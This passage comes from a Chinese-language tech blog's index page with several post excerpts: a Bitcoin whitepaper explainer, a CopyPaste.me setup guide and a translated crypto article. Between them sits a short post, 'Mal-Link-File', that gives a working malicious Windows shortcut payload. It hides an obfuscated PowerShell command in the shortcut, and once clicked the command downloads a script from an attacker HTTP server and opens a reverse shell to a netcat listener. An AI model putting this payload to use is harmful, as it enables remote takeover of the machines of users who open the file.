<li>如果遇到壞人掌控大部分網路（像51%攻擊），SPV用戶有可能被騙。</li>
<li>不過一旦發現有可疑，SPV用戶可以選擇下載完整區塊來自己驗證。</li>
</ul></li>
</ol>
<hr />
<h1
id="九價值的組合與分割-combining-and-splitting-value">九、價值的組合與分割
(Combining and Splitting Value)</h1>
<p>你有沒有想過，比特幣怎麼「找零」？怎麼把一大筆錢拆開來用，或把零錢湊一湊付出去？</p>
<p>比特幣的「找零」和現金很像，這一切都靠一個叫「UTXO」的設計。</p>
<ol type="1">
<li><strong>什麼是UTXO？</strong>
<ul>
<li>UTXO就是「尚未花費的交易輸出」（Unspent Transaction Output）。</li>
<li>你可以把它想像成一張張「找零券」或「現金券」，每一張都記錄著金額和歸屬。</li>
</ul></li>
<li><strong>怎麼組合和分割？</strong>
<ul>
<li>假設Alice有三張UTXO：2 BTC、3 BTC、1 BTC。</li>
<li>她要付5 BTC給Bob，就可以把2 BTC和3
BTC這兩張「現金券」一起用掉。</li>
<li>如果她用超過的金額（比如2+3+4=9 BTC），多出來的4
BTC就會自動找零，變成一張新的UTXO回到她自己手上。</li>
</ul></li>
<li><strong>每次收錢都會產生新的UTXO</strong>
<ul>
<li>Bob收到5 BTC後，這5 BTC就會變成他錢包裡的一張新UTXO。</li>
<li>以後他要付錢，也會用這張UTXO當作「現金券」來花。</li>
</ul></li>
<li><strong>為什麼要這樣設計？</strong>
<ul>
<li>這種方式讓比特幣交易可以靈活組合、分割，就像現金一樣方便。</li>
<li>也讓系統更容易防止雙重支付，因為每張UTXO只能花一次。</li>
<li>而且每一筆UTXO都能追蹤來源，讓整個系統更透明。</li>
</ul></li>
<li><strong>和傳統帳戶有什麼不同？</strong>
<ul>
<li>傳統銀行帳戶是「一個帳戶一個餘額」，比特幣則是「一堆UTXO加起來就是你的總額」。</li>
<li>這樣做可以讓交易更容易並行處理，也比較不容易出現爭議。</li>
</ul></li>
</ol>
<hr />
<h1 id="十隱私-privacy">十、隱私 (Privacy)</h1>
<p>你可能會問：「比特幣不是公開透明嗎？那我的隱私怎麼辦？」</p>
<p>其實，比特幣的隱私設計很有巧思，它不是完全匿名，而是「偽匿名」——
也就是說，大家看得到交易紀錄，但看不到真實身份。</p>
<ol type="1">
<li><strong>怎麼保護隱私？</strong>
<ul>
<li>每個人用的是「公鑰」或「地址」來收發比特幣，這些地址不會直接顯示你的名字。</li>
<li>你可以每次交易都用新的地址，這樣別人就很難把所有交易都連到你身上。</li>
<li>這有點像股票市場的「號碼牌」，大家只看到號碼，不知道背後是誰。</li>
</ul></li>
<li><strong>隱私的限制</strong>
<ul>
<li>如果你在交易所用過KYC（身份認證），那麼這個地址就有可能被追蹤到你本人。</li>
<li>如果一筆交易有多個輸入，這些輸入很可能都屬於同一個人，這也可能被分析出來。</li>
</ul></li>
<li><strong>怎麼提升隱私？</strong>
<ul>
<li>最簡單的方法就是每次收款都用新地址，盡量不要重複使用同一個地址。</li>
<li>也可以用混幣服務（像CoinJoin）來增加隱私。</li>
</ul></li>
<li><strong>比特幣的隱私意義</strong>
<ul>
<li>用戶可以不用靠銀行或政府，也能保有一定程度的財務隱私。</li>
<li>這種設計也啟發了後來的隱私幣（像Monero、Zcash）和各種混幣技術。</li>
</ul></li>
</ol>
<hr />
<h1 id="十一計算-calculations">十一、計算 (Calculations)</h1>
<p>你可能會好奇，比特幣怎麼用數學來保證安全？這裡有個很有趣的概念叫「隨機漫步」，我們用生活化的方式來解釋：</p>
<ol type="1">
<li><strong>什麼是隨機漫步？</strong>
<ul>
<li>想像你站在一條直線上，每次丟硬幣，正面就往右走一步，反面就往左走一步。</li>
<li>每一步都是隨機的，走到哪裡完全看運氣，這就叫「隨機漫步」。</li>
<li>這種走法有個特點：你未來會走到哪裡，只跟你現在的位置有關，跟你怎麼走到這裡來沒關係（這叫「無記憶性」）。</li>
</ul></li>
<li><strong>比特幣怎麼用這個概念？</strong>
<ul>
<li>在比特幣裡，誠實的礦工和攻擊者就像在比賽誰先走到終點。</li>
<li>誠實礦工每挖出一個區塊，就往前一步；攻擊者每挖出一個區塊，也往前一步。</li>
<li>只要誠實礦工的「步數」比攻擊者多，整個系統就很安全。</li>
</ul></li>
<li><strong>雙重支付的攻擊機率</strong>
<ul>
<li>假設攻擊者想要「重花」一筆錢，他必須自己偷偷挖一條比誠實礦工還長的區塊鏈。</li>
<li>但只要大多數算力在誠實礦工手上，攻擊者每落後一個區塊，追上的機率就會指數級下降。</li>
<li>這就像你和朋友賽跑，每落後一步，要追上就越難。</li>
</ul></li>
<li><strong>等幾個確認才安全？</strong>
<ul>
<li>比特幣建議，收到一筆大額交易時，最好等6個區塊確認（大約1小時），這樣攻擊者想要追上就幾乎不可能。</li>
<li>小額交易可以等少一點，根據風險自己決定。</li>
</ul></li>
<li><strong>數學公式（給有興趣的人）</strong>
<ul>
<li>白皮書裡有一個計算攻擊成功機率的公式，基本上就是用「卜瓦松分布」來算。</li>
<li>只要攻擊者的算力不是大多數，等的區塊越多，安全性就越高。</li>
</ul></li>
</ol>
<hr />
<p>這樣，比特幣就用簡單的數學和機率，讓大家可以放心地在網路上用「去中心化」的方式交易，不怕被作弊！</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/crypto-currencies/" style="color: #00bcd4">crypto-currencies</a>
        </span>
        
    </div>
    <a href="/2025/06/25/bitcoin-whitepaper/" class="go-post">閱讀全文</a>
</div>

<div class="post">
    <a href="/2025/06/25/setup-copypasteme-guide/">
        <h2 class="post-title">CopyPaste.me Full Setup Guide</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2025/6/25
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h2 id="目錄">目錄</h2>
<ol type="1">
<li><a href="#1-系統更新">系統更新</a></li>
<li><a href="#2-裝-nodejs">裝 Node.js</a></li>
<li><a href="#3-裝-mongodb-80">裝 MongoDB 8.0</a></li>
<li><a href="#4-裝-php">裝 PHP</a></li>
<li><a href="#5-拉專案下來">拉專案下來</a></li>
<li><a href="#6-裝-node-依賴">裝 Node 依賴</a></li>
<li><a href="#7-設定專案">設定專案</a></li>
<li><a href="#8-搞定-mongodb-資料庫">搞定 MongoDB 資料庫</a></li>
<li><a href="#9-加個-ssl-選用">加個 SSL (選用)</a></li>
<li><a href="#10-建置前端">建置前端</a></li>
<li><a href="#11-啟動後端">啟動後端</a></li>
<li><a href="#12-跑前端">跑前端</a></li>
<li><a href="#13-設成服務-選用">設成服務 (選用)</a></li>
<li><a href="#14-遇到問題">遇到問題？</a></li>
<li><a href="#15-小撇步">小撇步</a></li>
</ol>
<hr />
<h2 id="系統更新">1. 系統更新</h2>
<p>先把系統弄乾淨，確保套件都是最新的。Ubuntu 直接敲這兩行：</p>
<div class="sourceCode" id="cb1"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt update <span class="kw">&amp;&amp;</span> <span class="fu">sudo</span> apt upgrade <span class="at">-y</span></span>
<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt install <span class="at">-y</span> build-essential python3</span></code></pre></div>
<p>macOS 就用 Homebrew 更新吧，應該不用我多說，你懂的！</p>
<hr />
<h2 id="裝-node.js">2. 裝 Node.js</h2>
<p>用 <strong>nvm</strong> 裝 Node.js，這樣切版本超方便。</p>
<h3 id="a.-裝-nvm">a. 裝 nvm</h3>
<div class="sourceCode" id="cb2"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-o-</span> https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh <span class="kw">|</span> <span class="fu">bash</span></span></code></pre></div>
<p>裝完後，把這段加到你的 <code>~/.bashrc</code> 或
<code>~/.zshrc</code>：</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">NVM_DIR</span><span class="op">=</span><span class="st">&quot;</span><span class="va">$(</span><span class="bu">[</span> <span class="ot">-z</span> <span class="st">&quot;</span><span class="va">$&#123;XDG_CONFIG_HOME</span><span class="op">-</span><span class="va">&#125;</span><span class="st">&quot;</span> <span class="bu">]</span> <span class="kw">&amp;&amp;</span> <span class="bu">printf</span> %s <span class="st">&quot;</span><span class="va">$&#123;HOME&#125;</span><span class="st">/.nvm&quot;</span> <span class="kw">||</span> <span class="bu">printf</span> %s <span class="st">&quot;</span><span class="va">$&#123;XDG_CONFIG_HOME&#125;</span><span class="st">/nvm&quot;</span><span class="va">)</span><span class="st">&quot;</span></span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="bu">[</span> <span class="ot">-s</span> <span class="st">&quot;</span><span class="va">$NVM_DIR</span><span class="st">/nvm.sh&quot;</span> <span class="bu">]</span> <span class="kw">&amp;&amp;</span> <span class="ex">\.</span> <span class="st">&quot;</span><span class="va">$NVM_DIR</span><span class="st">/nvm.sh&quot;</span></span></code></pre></div>
<p>重開終端機，或直接跑這段讓它生效。</p>
<h3 id="b.-裝-lts-版本">b. 裝 LTS 版本</h3>
<div class="sourceCode" id="cb4"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nvm</span> install <span class="at">--lts</span></span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="ex">nvm</span> use <span class="at">--lts</span></span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="ex">nvm</span> alias default <span class="st">&#39;lts/*&#39;</span></span></code></pre></div>
<p>檢查一下版本，確認沒問題：</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">node</span> <span class="at">-v</span></span>
<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="ex">npm</span> <span class="at">-v</span></span></code></pre></div>
<hr />
<h2 id="裝-mongodb-8.0">3. 裝 MongoDB 8.0</h2>
<p>MongoDB 是這專案的資料庫，Ubuntu 和 macOS 裝法不一樣。</p>
<h3 id="ubuntu">Ubuntu</h3>
<div class="sourceCode" id="cb6"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt-get install <span class="at">-y</span> gnupg curl</span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="at">-fsSL</span> https://www.mongodb.org/static/pgp/server-8.0.asc <span class="kw">|</span> <span class="dt">\</span></span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>   <span class="fu">sudo</span> gpg <span class="at">-o</span> /usr/share/keyrings/mongodb-server-8.0.gpg <span class="at">--dearmor</span></span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">&quot;deb [ arch=amd64,arm64 signed-by=/usr/share/keyrings/mongodb-server-8.0.gpg ] https://repo.mongodb.org/apt/ubuntu noble/mongodb-org/8.0 multiverse&quot;</span> <span class="kw">|</span> <span class="fu">sudo</span> tee /etc/apt/sources.list.d/mongodb-org-8.0.list</span>
<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt-get update</span>
<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt-get install <span class="at">-y</span> mongodb-org</span>
<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> systemctl start mongod</span>
<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> systemctl enable mongod</span></code></pre></div>
<h3 id="macos">macOS</h3>
<p>用 Homebrew，裝 6.0 版（8.0 可能有相容性問題）：</p>
<div class="sourceCode" id="cb7"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">brew</span> tap mongodb/brew</span>
<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">brew</span> install mongodb-community@6.0</span>
<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="ex">brew</span> services start mongodb-community@6.0</span></code></pre></div>
<hr />
<h2 id="裝-php">4. 裝 PHP</h2>
<p>前端要用 PHP 跑，簡單裝一下：</p>
<h3 id="ubuntu-1">Ubuntu</h3>
<div class="sourceCode" id="cb8"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt install <span class="at">-y</span> php php-cli php-mbstring php-xml php-json</span></code></pre></div>
<h3 id="macos-1">macOS</h3>
<div class="sourceCode" id="cb9"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">brew</span> install php</span></code></pre></div>
<p>檢查版本：</p>
<div class="sourceCode" id="cb10"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="ex">php</span> <span class="at">-v</span></span></code></pre></div>
<hr />
<h2 id="拉專案下來">5. 拉專案下來</h2>
<p>從 GitHub 把專案抓下來：</p>
<div class="sourceCode" id="cb11"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/TheSocialCode/CopyPaste.me.git</span>
<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> CopyPaste.me</span></code></pre></div>
<hr />
<h2 id="裝-node-依賴">6. 裝 Node 依賴</h2>
<p>進專案資料夾，裝依賴前先把 <code>node-sass</code> 換成
<code>sass</code>：</p>
<div class="sourceCode" id="cb12"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="ex">npm</span> uninstall node-sass</span>
<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="ex">npm</span> install sass</span>
<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="ex">npm</span> install</span></code></pre></div>
<hr />
<h2 id="設定專案">7. 設定專案</h2>
<ol type="1">
<li><p>複製設定檔範本：</p>
<div class="sourceCode" id="cb13"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="fu">cp</span> CopyPaste.config.json-dist CopyPaste.config.json</span></code></pre></div></li>
<li><p>編輯 <code>CopyPaste.config.json</code>，把 MongoDB
連線資訊填好：</p>
<div class="sourceCode" id="cb14"><pre
class="sourceCode json"><code class="sourceCode json"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="er">&quot;mongodb&quot;:</span> <span class="fu">&#123;</span></span>
<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;host&quot;</span><span class="fu">:</span> <span class="st">&quot;127.0.0.1&quot;</span><span class="fu">,</span></span>
<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;port&quot;</span><span class="fu">:</span> <span class="dv">27017</span><span class="fu">,</span></span>
<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;dbname&quot;</span><span class="fu">:</span> <span class="st">&quot;copypaste&quot;</span><span class="fu">,</span></span>
<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;username&quot;</span><span class="fu">:</span> <span class="st">&quot;copypaste&quot;</span><span class="fu">,</span></span>
<span id="cb14-6"><a href="#cb14-6" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;password&quot;</span><span class="fu">:</span> <span class="st">&quot;password123456789&quot;</span></span>
<span id="cb14-7"><a href="#cb14-7" aria-hidden="true" tabindex="-1"></a><span class="fu">&#125;</span></span></code></pre></div>
<p>如果要用 HTTPS，SSL 路徑晚點再填（見步驟 9）。</p></li>
</ol>
<hr />
<h2 id="搞定-mongodb-資料庫">8. 搞定 MongoDB 資料庫</h2>
<p>連到 MongoDB：</p>
<div class="sourceCode" id="cb15"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">mongosh</span></span></code></pre></div>
<p>在 MongoDB Shell 裡跑這段：</p>
<div class="sourceCode" id="cb16"><pre
class="sourceCode js"><code class="sourceCode javascript"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a>use copypaste</span>
<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>db<span class="op">.</span><span class="fu">createUser</span>(&#123;</span>
<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">user</span><span class="op">:</span> <span class="st">&quot;copypaste&quot;</span><span class="op">,</span></span>
<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">pwd</span><span class="op">:</span> <span class="st">&quot;password123&quot;</span><span class="op">,</span></span>
<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a>  <span class="dt">roles</span><span class="op">:</span> [ &#123; <span class="dt">role</span><span class="op">:</span> <span class="st">&quot;readWrite&quot;</span><span class="op">,</span> <span class="dt">db</span><span class="op">:</span> <span class="st">&quot;copypaste&quot;</span> &#125; ]</span>
<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a>&#125;)</span>
<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a>exit</span></code></pre></div>
<hr />
<h2 id="加個-ssl-選用">9. 加個 SSL (選用)</h2>
<p>想用 HTTPS？自己簽個憑證試試：</p>
<div class="sourceCode" id="cb17"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> <span class="at">-p</span> ssl</span>
<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="ex">openssl</span> req <span class="at">-x509</span> <span class="at">-newkey</span> rsa:4096 <span class="at">-sha256</span> <span class="at">-days</span> 365 <span class="at">-nodes</span> <span class="dt">\</span></span>
<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a>  <span class="at">-nodes</span> <span class="at">-keyout</span> ssl/server.key <span class="at">-out</span> ssl/server.crt <span class="dt">\</span></span>
<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a>  <span class="at">-keyout</span> ssl/server.key <span class="at">-out</span> ssl/server.crt <span class="dt">\</span></span>
<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a>  <span class="at">-subj</span> <span class="st">&quot;/CN=localhost&quot;</span></span></code></pre></div>
<p>然後在 <code>CopyPaste.config.json</code> 裡加 SSL 路徑：</p>
<div class="sourceCode" id="cb18"><pre
class="sourceCode json"><code class="sourceCode json"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="er">&quot;ssl&quot;:</span> <span class="fu">&#123;</span></span>
<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;key&quot;</span><span class="fu">:</span> <span class="st">&quot;/path/to/server.key&quot;</span><span class="fu">,</span></span>
<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;certificate&quot;</span><span class="fu">:</span> <span class="st">&quot;/path/to/server.crt&quot;</span></span>
<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="fu">&#125;</span></span></code></pre></div>
<p>記得把路徑換成真的！</p>
<hr />
<h2 id="建置前端">10. 建置前端</h2>
<p>跑這行建置前端：</p>
<div class="sourceCode" id="cb19"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="ex">npm</span> run build</span></code></pre></div>
<p>沒反應？試試：</p>
<div class="sourceCode" id="cb20"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="ex">npx</span> webpack <span class="at">--config</span> webpack.config.js</span></code></pre></div>
<p>輸出會在 <code>web/static/dist/</code>。</p>
<hr />
<h2 id="啟動後端">11. 啟動後端</h2>
<h3 id="正式環境">正式環境</h3>
<p>直接開跑：</p>
<div class="sourceCode" id="cb21"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="ex">node</span> app/server/CopyPaste.server.js</span></code></pre></div>
<h3 id="開發環境">開發環境</h3>
<p>不想用 SSL 或 MongoDB 驗證：</p>
<div class="sourceCode" id="cb22"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">node</span> app/server/CopyPaste.server.js https=false mongoAuthenticate=false</span></code></pre></div>
<h3 id="用-pm2推薦">用 pm2（推薦）</h3>
<p>裝 pm2：</p>
<div class="sourceCode" id="cb23"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="ex">npm</span> install <span class="at">-g</span> pm2</span></code></pre></div>
<p>然後用 pm2 跑：</p>
<div class="sourceCode" id="cb24"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="ex">pm2</span> start app/server/CopyPaste.server.js <span class="at">--mode</span><span class="op">=</span>dev https=false</span></code></pre></div>
<hr />
<h2 id="跑前端">12. 跑前端</h2>
<p>進 <code>web</code> 資料夾，用 PHP 開個 server：</p>
<div class="sourceCode" id="cb25"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> web</span>
<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a><span class="ex">php</span> <span class="at">-S</span> 0.0.0.0:8080</span></code></pre></div>
<p>瀏覽器打開：<a
target="_blank" rel="noopener" href="http://localhost:8080/">http://localhost:8080/</a></p>
<hr />
<h2 id="設成服務-選用">13. 設成服務 (選用 )</h2>
<p>想讓後端一直跑？用 <strong>pm2` 或 </strong>systemd**。pm2
簡單，直接參考步驟 11；systemd 就自己去查文件，應該難不倒你！</p>
<hr />
<h2 id="遇到問題">14. 遇到問題？</h2>
<ul>
<li><p><strong>3000 埠看到 “Cannot GET /”?</strong><br />
→ 你跑錯地方了，去 <a
target="_blank" rel="noopener" href="http://localhost:8080/">http://localhost:8080/</a> 才對。</p></li>
<li><p><strong>頁面空白？</strong><br />
→ F12 開控制台，看看有啥報錯。PHP 日誌也瞄一下。</p></li>
<li><p><strong>MongoDB 連不上？</strong><br />
→ 檢查 <code>mongod</code>
有沒有跑（<code>sudo systemctl status mongod</code>），再確認
<code>CopyPaste.config.json</code> 裡的帳密對不對。</p></li>
</ul>
<hr />
<h2 id="小撇步">15. 小撇步</h2>
<ul>
<li>裝東西前，確認 Node.js、MongoDB、PHP 版本，避免踩雷。</li>
<li>可以試試 Docker 或雲端部署，省事又穩。</li>
</ul>
<hr />
<p>搞定～你的 CopyPaste.me
應該已經跑起來了！有啥狀況，翻翻問題排除，或去 GitHub
官方文件找救兵。😎</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/setup/" style="color: #ff7d73">setup</a>
        </span>
        
        <span class="tag">
            
            <a href="/tags/copypaste/" style="color: #ffa2c4">copypaste</a>
        </span>
        
    </div>
    <a href="/2025/06/25/setup-copypasteme-guide/" class="go-post">閱讀全文</a>
</div>

<div class="post">
    <a href="/2025/06/10/mal-link-file/">
        <h2 class="post-title">Mal-Link-File</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2025/6/10
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h1 id="table-of-contents">Table of Contents</h1>
<ul>
<li><a href="#basic">Basic</a></li>
<li><a href="#exploit">Exploit</a></li>
<li><a href="#reference">Reference</a></li>
</ul>
<h1 id="basic">Basic</h1>
<ul>
<li>捷徑的<a
target="_blank" rel="noopener" href="https://stackoverflow.com/questions/1880321/why-does-the-260-character-path-length-limit-exist-in-windows">最高可以輸入260個字元</a></li>
<li>PowerShell -ec 可以使用 Base64 編碼，但是必須是 UTF-16LE 編碼的字串
<img src="/2025/06/10/mal-link-file/pwsh-base64.png" class="" title="PowerShell Base64 Encode"></li>
<li>測試用指令編碼 👉 <a
target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/#recipe=Encode_text(&#39;UTF-16LE%20(1200)&#39;)To_Base64(&#39;A-Za-z0-9%2B/%3D&#39;)&amp;input=d2hvYW1pIC9wcml2">CyberChef</a></li>
<li>製作cmd.exe的捷徑，並將指令塞入</li>
</ul>
<div class="sourceCode" id="cb1"><pre
class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>C<span class="op">:</span>\Windows\System32\cmd<span class="op">.</span><span class="fu">exe</span> <span class="op">/</span>k <span class="st">&quot;start winword %cd%/test.docx &amp;&amp; set z=ec &amp;&amp; call powershell -exec bypass -nop -%z%dwBoAG8AYQBtAGkAIAAvAHAAcgBpAHYA&quot;</span></span></code></pre></div>
<img src="/2025/06/10/mal-link-file/pwsh-test.png" class="">
<h1 id="exploit">Exploit</h1>
<ul>
<li>建立 http server <img src="/2025/06/10/mal-link-file/http-server.png" class=""></li>
<li>設立 nc 接收回彈的 shell <img src="/2025/06/10/mal-link-file/nc-shell.png" class=""></li>
<li>捷徑內指令</li>
</ul>
<div class="sourceCode" id="cb2"><pre
class="sourceCode powershell"><code class="sourceCode powershell"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="op">%</span>systemroot<span class="op">%</span>\System32\cmd<span class="op">.</span><span class="fu">exe</span> <span class="op">/</span>c <span class="st">&quot;call powershell -exec bypass -nop iex(New-Object Net.WebClient).DownloadString(&#39;http://172.28.166.2:8000/Invoke%2DPowerShellTcp%2Eps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 172.28.166.2 -Port 9999&quot;</span></span></code></pre></div>
<ul>
<li>待使用者點擊捷徑後，便可接收到 shell <img src="/2025/06/10/mal-link-file/get-shell.png" class=""></li>
</ul>
<h1 id="reference">Reference</h1>
<ul>
<li><a
target="_blank" rel="noopener" href="https://www.mcafee.com/blogs/other-blogs/mcafee-labs/rise-of-lnk-shortcut-files-malware/">https://www.mcafee.com/blogs/other-blogs/mcafee-labs/rise-of-lnk-shortcut-files-malware/</a></li>
<li><a
target="_blank" rel="noopener" href="https://www.trendmicro.com/en_vn/research/17/e/rising-trend-attackers-using-lnk-files-download-malware.html">https://www.trendmicro.com/en_vn/research/17/e/rising-trend-attackers-using-lnk-files-download-malware.html</a></li>
</ul>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/exploit/" style="color: #ff7d73">exploit</a>
        </span>
        
    </div>
    <a href="/2025/06/10/mal-link-file/" class="go-post">閱讀全文</a>
</div>

<div class="post">
    <a href="/2025/06/10/how-cryptocurrencies-work-translation/">
        <h2 class="post-title">How Cryptocurrencies Work (Technical Guide)</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2025/6/10
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <blockquote>
<p>原文：https://medium.com/learning-lab/how-cryptocurrencies-work-technical-guide-95950c002b8f</p>
</blockquote>
<h2
id="區塊鏈加密學與共識機制解析-blockchain-cryptography-and-consensus-mechanisms-explained">#9
— 區塊鏈、加密學與共識機制解析 (Blockchain, Cryptography, and Consensus
Mechanisms Explained)</h2>
<p><strong>作者：Sandoche ADITTANE</strong><br />
<strong>發布於：<a target="_blank" rel="noopener" href="https://medium.com/learning-lab">Learning
Lab</a></strong><br />
<strong>閱讀時間：15 分鐘</strong><br />
<strong>發布日期：2018年5月8日</strong></p>
<p><img
src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Gwi60Nw-SVS1q4kBxrf6sw.jpeg"
alt="加密貨幣圖片" /><br />
<em>圖片來源：<a target="_blank" rel="noopener" href="https://photos.icons8.com">Icons8
